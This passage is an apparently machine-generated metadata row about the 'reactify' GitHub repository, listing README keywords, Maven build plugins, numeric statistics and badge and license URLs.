'reactify']",3,0,0,"['download', 'get', 'start', 'contribute', 'star', 'history', 'contributor', 'license', 'lead', 'this', 'project']",7,"['download', 'get', 'start', 'contribute', 'star']",4,0.0,8.0,"[com.diffplug.spotless:spotless-maven-plugin,com.mycila:license-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,7.0,1.0,5418,37.0,5.714082503556188,"['![SonarCloud -> https://sonarcloud.io/images/project_badges/sonarcloud-white.svg', '![CircleCI -> https://circleci.com/gh/hoangtien2k3/reactify.svg?style=svg', '![Quality Gate Status -> https://sonarcloud.io/api/project_badges/measure?project=hoangtien2k3_reactify&metric=alert_status', '![Lines of Code -> https://sonarcloud.io/api/project_badges/measure?project=hoangtien2k3_reactify&metric=ncloc', '![GitHub Release -> https://img.shields.io/github/v/release/hoangtien2k3/reactify?label=latest%20release', '![License -> https://img.shields.io/badge/license-Apache--2.0-green.svg', '![OpenSSF Best Practices -> https://www.bestpractices.dev/projects/9383/badge', '![Build status -> https://github.com/ponfee/commons-core/workflows/build-with-maven/badge.svg', '![GitHub Release -> https://img.shields.io/github/v/release/hoangtien2k3/reactify?label=latest', 'here -> https://central.sonatype.com/namespace/io.github.hoangtien2k3', 'Alt -> https://repobeats.axiom.co/api/embed/31a861bf21d352264c5c122808407abafb97b0ef.svg ""Repobeats analytics image""', 'Apache License, Version 2.0 -> https://www.apache.org/licenses/LICENSE-2.0']",12
